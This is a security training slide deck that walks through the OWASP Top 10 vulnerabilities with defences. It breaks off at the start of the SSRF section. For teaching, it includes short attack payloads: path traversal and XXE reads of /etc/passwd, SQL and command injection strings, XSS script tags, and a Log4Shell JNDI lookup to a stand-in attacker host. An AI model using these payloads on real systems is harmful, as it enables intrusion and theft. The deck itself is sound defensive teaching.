---
# Copyright 2022 Instaclustr Pty Ltd
# 
# This work is licensed under the Creative Commons Attribution-ShareAlike 4.0 International License. To view a copy of this license, visit http://creativecommons.org/licenses/by-sa/4.0/ or send a letter to Creative Commons, PO Box 1866, Mountain View, CA 94042, USA.

marp: true
---
<style>
h1 {
  text-align: center
}

blockquote {
    border-top: 0.1em dashed #555;
    font-size: 40%;
    /* margin-top: auto; */
}

.section-start-container {
  width: 100%;
  height: 100%;
}

.section-start-left {
    width: 50%;
    height: 100%;
    float: left;
    text-align: center
}

.section-start-right {
  width: 45%;
  height: 100%;
  position: relative;
  float: right;
  background-color: #EDEDED;
  padding: 0.5em
}

.sensitive-classification {
    text-align: right;
    background-color: blue;
    color: white;
}
</style>

# Software Engineer Security Training

---

### Security is Important

Security is a critical aspect of working as a professional software engineer.

While the common programming languages and frameworks we work with are making more and more efforts over time to improve security by default, it’s important for all developers to have a broad understanding of the most common vulnerabilities and how to defend against them.

---

### Keeping up to Date

Today’s training is based primarily on the OWASP Top 10 (2021), with bits from PCI DSS 6.5 requirements and the SANS Top 25.

Advice will change over your career, so make sure to keep your knowledge up to date over time!

> https://owasp.org/Top10/
> https://www.pcisecuritystandards.org/document_library
> https://www.sans.org/top25-software-errors/

---

<div class="section-start-container">
  <div class="section-start-left">
    <h2>Broken Access Control</h2>
    <p>
      <h3>OWASP A01:2021</h3>
      <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">owasp.org/Top10/A01_2021-Broken_Access_Control/</a>
    </p>
  </div>
  <div class="section-start-right">
    <p>
      Access Control is the part of your system which enforces that users can only perform intended actions.
    </p><p>
      Hence, a broken access control system allows users to perform actions we don’t intend for them to be able to perform.
    </p><p>
      How might that happen?
    </p>
  </div>
</div>

---

## Including Sensitive Information in Sent Data

Imagine a staff listing webpage with something like this...

```
  <li>
    Teacher McTearcherson
    <span style="display:none">Social Security Number: 123 456 789</span>
  </li>
```

Masking sensitive information simply by hiding it from being presented doesn't prevent people viewing the source to find it.

The same would apply for any case where we include unnecessary sensitive data in what is being sent to some client program.

[Missouri teachers’ Social Security numbers at risk on state agency’s website](https://www.stltoday.com/news/local/education/missouri-teachers-social-security-numbers-at-risk-on-state-agencys-website/article_f3339700-ece0-54a1-9a45-f300321b7c82.html) reports on an example of this occurring in practice in 2021.


> [CWE-200](https://cwe.mitre.org/data/definitions/200.html) and [CWE-201](https://cwe.mitre.org/data/definitions/201.html)
> https://www.stltoday.com/news/local/education/missouri-teachers-social-security-numbers-at-risk-on-state-agencys-website/article_f3339700-ece0-54a1-9a45-f300321b7c82.html

---

## Path Traversal

Imagine this endpoint in a web app

http://example.com/admin/view-log?file=jetty/access.log

All good if we intend the admin to be able to read jetty’s access log.

But what if the admin can use that to load arbitrary other files?

http://example.com/admin/view-log?file=../../../../etc/passwd

> [CWE-35](https://cwe.mitre.org/data/definitions/35.html) and PCI DSS 6.5.8

---

## Forced Browsing

Imagine a web app which shows one of two possible links in the navigation bar, and decides which to show based on who’s logged into the system.

- [http://example.com/user/list-orders]() - Lists orders for the current user
- [http://example.com/admin/list-orders]() - Lists orders for all users (shown to admins only)

What if a normal user modifies the URL to claim to be an admin?

If we purely trust the URL because we hide links to it in the UI layer we risk exposing all the orders inappropriately. Access must always be controlled at the ‘business logic’ layer, not just as part of the presentation layer.

This kind of flaw would be an example of ‘security through obscurity’ 
“System security should not depend on the secrecy of the implementation...”
	([NIST Guide to General Server Security](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-123.pdf))

> [CWE-425](https://cwe.mitre.org/data/definitions/425.html) 

---

## Aside: A Primer on HTTP Cookies

HTTP is a stateless protocol, meaning that the web server doesn’t remember things from one request to the next, unlike something like ssh where you stay logged in over time.

How do I remain logged into a web app like Jira then?

Cookies!

The web server provides a small piece of data and asks the browser to send it back on every subsequent request to the same website.

Learn more at [https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies) if you need to.

---

## Cross Site Request Forgery (CSRF)

If I know you’re already logged into example-bank and I send you an email with…

```
  Check out this <a href=”
  http://example-bank.com/transfer?amount=100&to=me
  ”>Rick Astley video</a>!
```

…then you’ll have made the bank transfer as soon as you click the link, meaning I caused the system to perform an action you didn’t intend just because you were already logged into it.

> [CWE-352](https://cwe.mitre.org/data/definitions/352.html) and PCI DSS 6.5.9

---

## Defending Against CSRF

### Make the server require a POST request?

**No!**

Attacker will just give you a form, or use Javascript or Flash or who-knows-what else to send the exploit request as a POST.

### Don’t use cookies?

Sure, but you’ll need some other way to keep users logged in then.

- JSON Web Tokens explicitly added to an HTTP header is an option.
  - Take care not to create the issue again - e.g. making a single-page-app which triggers an action on loading some URL.

---

## Defending Against CSRF (continued)

If you have to use cookies, you should use a ‘CSRF token’.

1. When a session starts, generate, store and return a large random value for the user.
2. Require the user to submit their token value (e.g. via a hidden form field) on every request.
3. If the submitted value doesn’t match the stored value for that user, reject the request.

Since the attacker can’t know what value to submit, they’ll get rejected. Success!

If you’re ever responsible for implementing this kind of system, spend a lot of time learning about it first!

---

## Improper Privilege Management

What's wrong here?

```
Boolean createUserDirectory(String username) {
  try {
    os.escalatePrivileges();
    os.mkdir("/home/" + username);
    os.dropPrivileges();
  } catch (Exception e) {
    log.error("Failed to create directory for {}", username);
    return false;
  }
}
```

---

## Improper Privilege Management (continued)

In the previous example, if an exception occurs in mkdir, dropPrivileges is never called, leaving the os object with escalated privileges.

An attacker could potentially intentionally trigger this error to get into that state, and then exploit some subsequent call into os which expects to run with normal privileges.

Real world attacks are often a chain of vulnerabilities like this.

> [CWE-269](https://cwe.mitre.org/data/definitions/269.html)

---

## Use of Hard-coded Credentials

Sometimes it seems convenient to hard-code credentials (e.g. passwords or keys) rather than using proper secret management. This creates the risk (or inevitability) that the credential is discovered by an attacker and cannot easily be rotated to a new, secure value.

So please don’t ever hard-code credentials on either the client or server side of a connection. If you find you are looking at an external system or software component which appears to hard-code credentials, stop and investigate alternatives.

> [CWE-798](https://cwe.mitre.org/data/definitions/798.html)

---

<div class="section-start-container">
  <div class="section-start-left">
    <h2>Cryptographic Failures</h2>
    <p>
      <h3>OWASP A02:2021</h3>
      <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">owasp.org/Top10/A02_2021-Cryptographic_Failures/</a>
    </p>
  </div>
  <div class="section-start-right">
    <p>
      Failure to use appropriate encryption techniques where the data in question requires it (e.g. passwords, credit card numbers, personal information).
    </p>
    <p>
      Consider both data at rest (e.g. stored in a database or filesystem) or in transit (e.g. over the network).
    </p>
  </div>
</div>

---

## Not Encrypting Sensitive Data

The most obvious way to have a cryptographic failure vulnerability is simply not to make any attempt to encrypt sensitive data in the first place. For example

- Allowing login credentials to be sent over an HTTP connection.
- Storing credit-card numbers in an unencrypted database column.
- Storing sensitive data in a plain-text file on an unencrypted file system.

> [CWE-319](https://cwe.mitre.org/data/definitions/319.html), [CWE-523](https://cwe.mitre.org/data/definitions/523.html), PCI DSS 6.5.3 and PCI DSS 6.5.4

---

## Using a Broken Cryptographic Algorithm

Over time many widely used encryption schemes have become unsafe due to flaws in the underlying algorithms being discovered, making it possible for an attacker to quickly and cheaply decrypt data.

The [DES algorithm](https://en.wikipedia.org/wiki/Data_Encryption_Standard), for example, was once widely used, but has been insecure since the late 1990s.

The US Government [FIPS 140-2](https://csrc.nist.gov/publications/detail/fips/140/2/final) and [FIPS 140-3](https://csrc.nist.gov/publications/detail/fips/140/3/final) standards can be used as a reference for what algorithms are widely considered secure (in 2021).

Hopefully it goes without saying, but don’t use any home-grown cryptographic algorithms.

> [CVE-327](https://cwe.mitre.org/data/definitions/327.html)

---

## Configuring Cryptographic Algorithms

Even if appropriate cryptographic algorithms are selected, security may be compromised by weak configurations such as:
- Using poor random number generators or seed values ([CWE-330](https://cwe.mitre.org/data/definitions/330.html), [CWE-338](https://cwe.mitre.org/data/definitions/338.html)) or even reusing the same seed value each time the app is restarted ([CWE-336](https://cwe.mitre.org/data/definitions/336.html))

Defaulting to a strong algorithm, but allowing clients to negotiate a less secure algorithm ([CWE-757](https://cwe.mitre.org/data/definitions/757.html))
- This is often initially an attempt to maintain support for older clients while they are migrated, but must be regularly reviewed to remove insufficiently secure algorithms as time passes.

---

<div class="section-start-container">
  <div class="section-start-left">
    <h2>Injection</h2>
    <p>
      <h3>OWASP A03:2021</h3>
      <a href="https://owasp.org/Top10/A03_2021-Injection/">owasp.org/Top10/A03_2021-Injection/</a>
    </p>
  </div>
  <div class="section-start-right">
    <p>
      An application is vulnerable to an injection attack when user supplied data is processed by the application without being appropriately validated, filtered, escaped or sanitised.
    </p>
  </div>
</div>

---

## User Supplied Data

Can your app handle the user supplying input like this?
- `null`
- `,./;'[]\-=<>?:"{}|_+!@#$%^&*()`
- `"''''"'"`
- `<script>alert(0)</script>`
- `' OR '1'='1`
- `/dev/null; touch /tmp/blns.fail ; echo`
- `🐵 🙈 🙉 🙊`
- `¯\_(ツ)_/¯`

See https://github.com/minimaxir/big-list-of-naughty-strings for many more.

---

## SQL Injection

Concatenating a user-controlled string to an SQL statement before running it is a common form of injection.

```
http://example.com/show-item?id=123

String sqlQuery = "SELECT * FROM items WHERE id = " +
    request.getParameter("id");
```

What happens if an attacker loads…

```
http://example.com/show-item?id=123%3B%20DROP%20TABLE%20items
```
(i.e. `123; DROP TABLE items` with URL escaping)

> [CWE-89](https://cwe.mitre.org/data/definitions/89.html) and PCI DSS 6.5.1

---

## Defending Against SQL Injection

In this simple case, an option might be to validate the user’s input is a number, but that approach can’t work in all cases.

e.g. What characters are permitted in a person’s name? Read [falsehoods programmers believe about names](https://www.kalzumeus.com/2010/06/17/falsehoods-programmers-believe-about-names/) to find out why any validator you imagine is probably wrong!

A more general solution is to use a prepared statement, which makes the database parse the SQL before any user input is added.

```
try (PreparedStatement selectItem = con.prepareStatement(“SELECT * FROM items WHERE id = ?”)) {
    selectItem.setInt(1, request.getParameter("id"));
    ResultSet items = selectItem.executeQuery();
    // Use items to do whatever you’re doing
}
```

Regardless of what’s in the id parameter, the SQL statement has already been parsed, so the structure can’t change.

---

<div class="sensitive-classification">Internal Sensitive Slide</div>

## SQL Injection Security in Our ORM System

This is a placeholder for slides about SQL Injection in any particular
ORM systems you use in your environment since they have widely variable syntax.

It also serves as an example of how to label slides as sensitive if you add others that are specific to your internal environment.

Take care not to push them up to any public git repos!

---

## Injection Examples Beyond SQL

### OS Commands
```
Runtime.exec(“touch “ + request.getParameter("filename"))
```

### LDAP
```
var answer = new InitialDirContext(env).search(searchBase, "Address=" +
    request.getParameter("address"), searchCtls);
```

### XPath
```
xpath.compile("//items/item[id/text()='" + request.getParameter("item") + "'")
```

The lesson here is that any time you pass off user input for processing, you must be aware of the details of the system that will process it.

> [CWE-77](https://cwe.mitre.org/data/definitions/77.html), [CWE-90](https://cwe.mitre.org/data/definitions/90.html), [CWE-643](https://cwe.mitre.org/data/definitions/643.html) and PCI DSS 6.5.1

---

## Injection Example - log4shell

The Log4Shell ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)) vulnerability is a recent example of a very severe injection vulnerability in a widely used Java component (the log4j v2 logging library).

Specifically, if an attacker could cause an application to log a value containing a string like `${jndi:ldap://attacker.example.com/a}`, the logging library would attempt to interpret that string and make a request to the attacker's site, which could then cause the application to fetch a serialised Java class from the attacker and execute it!

Even worse, Log4j did not provide any mechanism to safely escape user input like this, meaning the only solution was to upgrade to a fixed version.

> https://nvd.nist.gov/vuln/detail/CVE-2021-44228
> https://en.wikipedia.org/wiki/Log4Shell
> https://www.lunasec.io/docs/blog/log4j-zero-day/

---

## Unrestricted Upload of File with Dangerous Type

Another common variation, especially in scripting language environments, is the attacker uploading a file containing, say, PHP code, then arranging for the file to be loaded by something, say mod_php, which will execute it.

Potential mitigation strategies include:
- Generating unique filename server-side with no user input.
- Storing file content in a separate area (e.g. different directory, inside a database) to avoid unintended execution.

Be wary of any approach based on restriction of user supplied file names/extensions. Something like malicious.php.gif may well be executed as PHP code by default despite ending in .gif 🤯

> [CWE-434](https://cwe.mitre.org/data/definitions/434.html)

---

## Cross Site Scripting (aka XSS)

User supplied data injected directly into a web page cedes complete control of the page
```
http://example.com/greet?user=Alex 
  -> “<html> … Hi Alex … </html>”
```

```
http://example.com/greet?user=
%3Cscript%3Ealert%28%22XSS%22%29%3B%3C%2Fscript%3E 
  -> “<html> … Hi <script>alert("XSS");</script> … </html>”
```

The attacker can easily steal cookies then log in as the victim, change the page to resemble a login screen and steal passwords, make other calls as the victim etc.

> [CWE-79](https://cwe.mitre.org/data/definitions/79.html) and PCI DSS 6.5.7. See also https://owasp.org/www-community/attacks/xss/

---

## Types of Cross Site Scripting (XSS)

That example is called a **reflected XSS** attack because the vulnerable page is ‘reflected’ back to the user who loaded the URL, so attacking a user would involve tricking them into clicking a crafted URL in, for example, an email.

A **DOM based XSS** attack is similar, however in this case all processing occurs on the browser side, for example the payload could be taken from `document.location.href` by javascript and injected back into the page with `document.write`.

Submitting the attack payload in a way the web app will store it and then display it in subsequent pages (e.g. via message in a forum) is called a **Stored XSS** attack.

A **blind XSS** attack is similar to a stored one, but specific to the case where the attacker can’t see the exploit. An example would be submitting a payload to a feedback form then waiting for a webmaster to view it via an authenticated page.

---

## Defending Against Cross Site Scripting (XSS)

General principle: Encode any user data appropriately on output

```
http://example.com/greet?user=
%3Cscript%3Ealert%28%22XSS%22%29%3B%3C%2Fscript%3E 
  -> “Hi &lt;script&gt;alert("XSS");&lt;/script&gt;”
```

However, be aware that different contexts require different encoding rules
- Within the body of an HTML element
- Within an HTML element attribute
- Within a Javascript string
- Within a style sheet or a style tag property value

And some locations, like in a script tags body or an attribute name are never safe.

Don’t try to write HTML encoding rules yourself! Well tested, reusable, encoding libraries exist for virtually every language.

---

<div class="section-start-container">
  <div class="section-start-left">
    <h2>Insecure Design</h2>
    <p>
      <h3>OWASP A04:2021</h3>
      <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">owasp.org/Top10/A04_2021-Insecure_Design/</a>
    </p>
  </div>
  <div class="section-start-right">
    <p>
      A perfect implementation can’t fix a flawed design.
    </p>
    <p>
      Think about security before you start coding.
    </p>
  </div>
</div>

---

## Consider Security Risks Before Implementation

Before writing any code, you should consider the security implications of a feature or change in some depth by developing and documenting a design which can be reviewed by other team members.

Note that this is not intended to necessitate a [big design up front](https://en.wikipedia.org/wiki/Big_Design_Up_Front) methodology, but rather to require thinking about the security consequences of each piece of work, which could be a single user story or bug fix, before that work is undertaken.

A rigorous design and peer review process helps address violations of secure design principles ([CWE-1000](https://cwe.mitre.org/data/definitions/657.html)), for example reliance on security through obscurity ([CWE-656](https://cwe.mitre.org/data/definitions/656.html)), as well as helping to identify high risk vulnerabilities (PCI DSS 6.5.6) before they are introduced.

> https://en.wikipedia.org/wiki/Big_Design_Up_Front

---

## Communicating With Structured Risk Descriptions

<style>
.present-condition {
  color: green;
}

.uncertain-event {
  color: orange;
}

.negative-consequence {
  color: red;
}
</style>

When describing risks within a design, the structured risk description format is helpful. This format separates a single risk statement into a present condition (assuming a planned change is made, feature is developed etc), an uncertain event and a negative consequence, which helps to clearly describe the risk.

As a result of <span class='present-condition'>(present condition)</span>, <span class='uncertain-event'>(uncertain event)</span> could occur, which would lead to <span class='negative-consequence'>(negative consequence)</span>.

For example:

As a result of <span class='present-condition'>making the HR database accessible on the public internet</span>, <span class='uncertain-event'>an unauthorised person could discover it and use some exploit to access it</span> which would lead to <span class='negative-consequence'>sensitive personal data being released</span>.

> Hillson, D. (2000). Project risks: identifying causes, risks, and effects. PM Network, 14(9), 48–51

---

## Communicating Mitigations

Once your design details each risk as a structured risk description, writing mitigations to address the risk becomes easier.

A risk is mitigated by doing one or more things which:
- reduce the likelihood of the uncertain event 
- reduce the impact of the negative consequence

In writing mitigations, it is helpful to clearly communicate how a mitigation is intended to reduce the risk. Continuing our previous example, we might have
- All columns containing sensitive data are encrypted with a key stored securely, and only accessible to the HR application. **Reduces consequence**
- We require database authentication on all connections. **Reduces likelihood**
- Database server has security patches applied promptly. **Reduces likelihood**

---

## Assessing Remaining Risk

Once we have understood risks and proposed mitigations we can assess the severity of the remaining risk using an assessment matrix like the following. This helps in prioritising what to address further, or communicating the risks of a piece of work to others.

<!-- 
You'll probably want to substitute this with the risk matrix used in your 
organisation as it's likely to differ a bit from this very basic example. 
-->

<table style="margin: auto; font-weight: bold; font-size: 110%;">
  <tbody>
    <tr>
      <th rowspan="4" style='background-color: white'>Consequence</th>
      <th style='background-color: white'>High</th>
      <td style='background-color: orange'>Medium</td>
      <td style='background-color: red'>High</td>
      <td style='background-color: pink'>Critical</td>
    </tr>
    <tr>
      <th style='background-color: white'>Medium</th>
      <td style='background-color: yellow'>Low</td>
      <td style='background-color: orange'>Medium</td>
      <td style='background-color: red'>High</td>
    </tr>
    <tr>
      <th style='background-color: white'>Low</th>
      <td style='background-color: lightgreen'>Very Low</td>
      <td style='background-color: yellow'>Low</td>
      <td style='background-color: orange'>Medium</td>
    </tr>
    <tr>
      <td style='background-color: white'></td>
      <th style='background-color: white'>Low</th>
      <th style='background-color: white'>Medium</th>
      <th style='background-color: white'>High</th>
    </tr>
    <tr>
      <td style='background-color: white'></td>
      <th colspan='4' style='text-align: center; background-color: white'>Likelihood</th>
    </tr>
  </tbody>
</table>

> https://owasp.org/www-community/OWASP_Risk_Rating_Methodology

---

## Defence in Depth

When considering how to design secure a system, avoid relying on a single layer of security. Instead, consider how multiple independent methods can be applied to achieve security, as this means security is maintained even if one layer is unexpectedly breached.

Some examples of where this approach is commonly applied 
- Authentication with both a password and a 2FA token
- HTTPS connections required to some service, which can also only be access over a VPN connection
- Restrict access to a database and also encrypt sensitive columns within the data contained within it

---

## Principle of Least Privilege

When designing an access control system, consider how permissions will be granted to users and systems, and how to support the idea that entities should only have permissions to perform actions they need to perform.

For example, don’t create a single permission which grants the ability to both:
- View analytics reports which might be of interest to a marketing/management persona
- Apply security patches to the application

This would result in user accounts being given to marketing users which can, unnecessarily, manage application security patches. Instead these should be separate permissions, enabling users to be granted only the access they actually need.

The same logic applies at all levels of a system’s design and choices about privileges granted to services themselves. e.g. a backup system should not have privileges to modify firewall rules.

---

## Post Incident Reviews

To improve over time as a team at designing and implementing secure software, run a Post Incident Review meeting with the team after any security incident.

Key Steps:
- Establish a timeline of events.
- Identify for root causes, understand and document them.
  - Read the Wikipedia page on ‘[Five whys](https://en.wikipedia.org/wiki/Five_whys)’ for a good starting point, though many other good root cause analysis approaches exist.
    - Assigning blame to individuals should be avoided; ‘Human error’ is not a useful root cause.
- Identify actions to improve processes, systems, priorities or team practices.
- Share the learnings within your boarder team, and write with this audience in mind.

> https://en.wikipedia.org/wiki/Five_whys

---

# Intermission

<!--
That's a lot of content to digest so far! Take a 10 minute break before continuing the presentation (or split it into two sessions and finish session #1 here).
-->

---

<div class="section-start-container">
  <div class="section-start-left">
    <h2>Security Misconfiguration</h2>
    <p>
      <h3>OWASP A05:2021</h3>
      <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">owasp.org/Top10/A05_2021-Security_Misconfiguration/</a>
    </p>
  </div>
  <div class="section-start-right">
    <p>
      Beware of insecure defaults, leaking information through error messages and unnecessary features being installed or enabled.
    </p>
  </div>
</div>

---

## Common Misconfigurations

- Sample applications for an application server left deployed and using default passwords.
- Directory listings left enabled and allowing an attacker to gather more information about a server’s environment and configuration. ([CWE-548](https://cwe.mitre.org/data/definitions/548.html))
- Detailed stack traces returned to users as error messages allowing an attacker to gather information and easily identify other exploits. ([CWE-209](https://cwe.mitre.org/data/definitions/209.html) and PCI DSS Requirement 6.5.5)
- Configuration files installed and left with permissive permissions, for example world readable and writable. ([CWE-732](https://cwe.mitre.org/data/definitions/732.html))

Many common library/framework dependencies require conscious configuration to operate securely, so this must be considered when introducing them, and actively reviewed over time.

---

## Improper Restriction of XML External Entities (XXE)

Default configurations for XML processing libraries often allows surprising security vulnerabilities.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

An attacker might also be able to make HTTP requests from the server processing the XML or consume threads forever by reading something infinite like /dev/random to create a denial-of-service. If PHP’s “expect” module is loaded it can be possible to execute arbitrary code.

> CWE-611 and see also https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing

---

## Defending Against XXE Vulnerabilities

Java specifically has many different XML processing libraries, and many a vulnerable by default.

Disabling XML document type definitions (DTDs) entirely is generally safest, and achieved with something similar to...

```
factory.setFeature(
    "http://apache.org/xml/features/disallow-doctype-decl", true);
```

OWASP’s XML External Entity Prevention Cheat Sheet contains many examples for different XML libraries as well as guidance on more targeted solutions which might be appropriate for applications which intend to use some DTD features.

> https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html

---

## Browser Security Headers

Modern web browsers support a wide range of security-related headers which can be provided by web applications to request restrictions on the browsers behaviour with that application, such as:

- **X-Frame-Options** - Preventing putting the app within a frame, which may avoid attacks tricking the user into clicking things they did not intend.
- **Strict-Transport-Security** - Causing the browser to always connect over HTTPS to the web app.
- **Access-Control-Allow-Origin** - Selectively allowing javascript requests originating from specific other sites while denying all others.
- **Content-Security-Policy** - Restricting the allowed sources of JavaScript code as an extra layer of defence against XSS

See cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html for a complete list of recommended headers to consider for new web applications.

---

<div class="section-start-container">
  <div class="section-start-left">
    <h2>Vulnerable and Outdated Components</h2>
    <p>
      <h3>OWASP A06:2021</h3>
      <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/</a>
    </p>
  </div>
  <div class="section-start-right">
    <p>
      If you are not consciously managing the security of external components, they are almost certainly vulnerable.
    </p>
  </div>
</div>

---

## Managing Security in Components

Out of date or unmaintained components frequently have security vulnerabilities which can open an application to exploit. Central dependency sources such as Maven central and NPM often introduce a large number of direct and transitive dependencies which must be considered.

- Actively remove unused components
- Include as few components as possible
- Use scanning tools as a part of the CI/CD pipeline to check for known vulnerabilities in the components currently being used.
  - When issues are found, upgrade or replace vulnerable components promptly
    - Prioritise those which are the highest risk based on CVE / NVD assessments
- Actively check for components which have become unmaintained and replace them
- Carefully assess new dependencies in the design process before introducing them

All this applies to external SaaS/cloud service components too!

---

<div class="section-start-container">
  <div class="section-start-left">
    <h2>Identification and Authentication Failures</h2>
    <p>
      <h3>OWASP A07:2021</h3>
      <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/</a>
    </p>
  </div>
  <div class="section-start-right">
    <p>
      Identification and Authentication is how an application knows who is using it at any given time.
    </p>
    <p>
      If an attacker can make the application treat them as some legitimate user, then they can cause a lot more trouble.
    </p>
  </div>
</div>

---

## Improper Authentication

CWE-287 is a broad weakness which describes any case where someone claims to be a particular user, but that claim is not sufficiently confirmed by the software. There are many ways in which this situation can arise, and over time the recommended practices around password handling in particular have changed. Things to consider here include:

- Restricting excessive authentication attempts to prevent brute-force guessing using a list of common passwords (CWE-307)
- Using multi-factor authentication instead of only a single factor (CWE-308)
- Avoiding weak password reset mechanisms, such as personal questions like ‘What was the name of your first school?’ (CWE-640)
- Imposing password requirements to prevent poor passwords like ‘Passw0rd’ being used (CWE-521)
  - NIST 800-63b, section 5.1.1 guidelines for memorised secrets, as of 2021, recommends a minimum password length, disallowing common passwords, and specifically not imposing password complexity requirements.

---

## Broken Authentication and Session Management

HTTP being a stateless protocol (as mentioned earlier) applications commonly implement their own session management, usually with cookies. The following are some common flaws in such session management implementations.

- Session token cookies lack the “secure” cookie property, which should be used to ensure they will not be sent over insecure HTTP connections where an attacker might capture them.
- Session identifiers are exposed in URLs, which enables an attacker to discover them from a URL shared by a user.
- Session IDs are not changed after a successful login, which prevents an attacker having a legitimate user login via the attacker’s session ID, giving the attacker access to the authenticated session (aka Session Fixation, CWE-384).
- Session IDs are not expired over time, meaning an attacker who intercepts a session ID need not use it immediately, and can reuse it indefinitely (CWE-613).

> PCI DSS 6.5.10

---

## Insufficiently Protected Credentials

When credentials are stored or transmitted, they must be kept secure to avoid the risk of an attacker discovering them.

- When storing passwords to authenticate a user, don’t store the plain-text of the password ([CWE-256](https://cwe.mitre.org/data/definitions/256.html)) or even something the plain-text can be derived from ([CWE-257](https://cwe.mitre.org/data/definitions/257.html)) like an encrypted version of the text.
  - Instead, store a one-way hash of the password which is expensive enough to calculate to make calculating the plain-text from the hash infeasible ([CWE-916](https://cwe.mitre.org/data/definitions/916.html)).
    - [Bcrypt](https://en.wikipedia.org/wiki/Bcrypt) is a reasonable choice of hash function today. [MD5](https://en.wikipedia.org/wiki/MD5) and [SHA-1](https://en.wikipedia.org/wiki/SHA-1) are bad choices.
- Unprotected transport of credentials, such as over a plain HTTP connection, creates a risk that an attacker may be able to capture them ([CWE-523](https://cwe.mitre.org/data/definitions/523.html))

---

## Improper Certificate Validation

Even when using HTTPS for sending authentication credentials, risks remain. HTTPS’s security is based on certificates, which indicate that the owner of a specific hostname proved to some trusted certificate authority that they are the rightful owner of that hostname.

To confirm that a connection is to the real server, and not some attacker intercepting traffic, decrypting it and forwarding it on, the client must check the certificate chain is trusted as well as that the hostname in the certificate matches the expected hostname it is connecting to.

> [CWE-295](https://cwe.mitre.org/data/definitions/295.html) and [CWE-297](https://cwe.mitre.org/data/definitions/297.html)

---

<div class="section-start-container">
  <div class="section-start-left">
    <h2>Software and Data Integrity Failures</h2>
    <p>
      <h3>OWASP A08:2021</h3>
      <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/</a>
    </p>
  </div>
  <div class="section-start-right">
    <p>
      If we don’t verify the integrity of the software we are running, then an attacker can change it for their own purposes unnoticed.
    </p>
  </div>
</div>


---

## Dependency Confusion and Substitution

Central dependency management systems like Maven Central, PyPI and NPM make it easy to source open-source dependencies, however care is required to ensure the expected dependency is the one used in practice.

- Attackers may put a copy of a dependency under a similar name or use a common typo to trick you into using the copy under their control.
- Attackers may gain maintainer access, add their exploit to new versions.
- If an internal company repository is the intended source, an attacker could add a public dependency with the same coordinates, which may then be preferred automatically, especially if they give it a higher version.

> [CWE-427](https://cwe.mitre.org/data/definitions/427.html)

---

## Defending Against Dependency Confusion and Substitution

- Verify the official coordinates of a dependency before adding it.
- Ensure the maintainers are trustworthy
- Pin dependencies to specific versions
- Understand the consequences of adding additional repository sources and how they are prioritised.

---

## Execution of Untrusted Code

There are many other ways an application might execute untrusted code. Some common vulnerabilities of this type arise from:
- Executing code (e.g. a script, a .jar file or even a binary) provided by a user.
- Downloading application updates without checking authenticity.
- Adding `<SCRIPT SRC="http://untrusted.domain">` to a web page.
  - Note the lack of HTTPS, but this could also include CDNs we haven’t carefully assessed. 
- Allowing `$PATH` or `$LD_PRELOAD` to influence command or library loading.
- Someone running 
`curl http://example.com/install.sh | sudo bash`

> [CWE-829](https://cwe.mitre.org/data/definitions/829.html), [CWE-426](https://cwe.mitre.org/data/definitions/426.html), [CWE-494](https://cwe.mitre.org/data/definitions/494.html) and [CWE-345](https://cwe.mitre.org/data/definitions/345.html)

---

## Deserialisation of Untrusted Data

Some serialisation/deserialisation mechanisms allow for objects with arbitrary behaviour to be deserialised, so if an attacker can modify the serialised data, they can likely execute arbitrary code.

Vulnerable mechanisms include Java’s built in serialisation system, Python’s Pickle library and PHP’s unserialise.

[OWASP’s deserialisation cheat sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html) offers some advice for defending against these types of attacks, however it is generally safer to use a pure-data format such a JSON wherever possible.

> [CWE-502](https://cwe.mitre.org/data/definitions/502.html)

---

<div class="section-start-container">
  <div class="section-start-left">
    <h2>Security Logging and Monitoring Failures</h2>
    <p>
      <h3>OWASP A09:2021</h3>
      <a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/">owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/</a>
    </p>
  </div>
  <div class="section-start-right">
    <p>
      Logging and monitoring is critical for detecting attacks quickly, and investigating them thoroughly afterwards.
    </p>
  </div>
</div>

---

## What Does Good Logging Look Like?

- Include events which are relevant for auditing. 
  - Logins, failed logins ([CWE-223](https://cwe.mitre.org/data/definitions/223.html), [CWE-778](https://cwe.mitre.org/data/definitions/778.html)), other critical actions for the application.
- Remove or mask any sensitive information **before** logging ([CWE-523](https://cwe.mitre.org/data/definitions/532.html)).
- Warnings and errors are included with enough information to be meaningful to someone reading the logs.
- Normal activity does not create warning/error entries within the logs.
- Not exposed to end users, as they may leak information to an attacker.
- Centralised and searchable, not kept only on the server in question.

Logs should also be monitored, with appropriate alerting thresholds and escalation procedures being in place to respond to suspicious or unusual activity.

---

## Improper Output Neutralisation for Logs

```
String val = request.getParameter("val");
try {
    int value = Integer.parseInt(val);
} catch (NumberFormatException) {
    log.info("Failed to parse val = " + val);
}
```

What happens if an attacker submits this?

```
?val=twenty-one%0a%0aINFO:+User+logged+out%3dattacker
```

We'd get the following in the log, which could make proper auditing impossible!

```
INFO: Failed to parse val = twenty-one
INFO: User logged out=attacker
```

> [CWE-117](https://cwe.mitre.org/data/definitions/117.html)

---

<div class="section-start-container">
  <div class="section-start-left">
    <h2>Server-Side Request Forgery (SSRF)</h2>
    <p>
      <h3>OWASP A10:2021</h3>
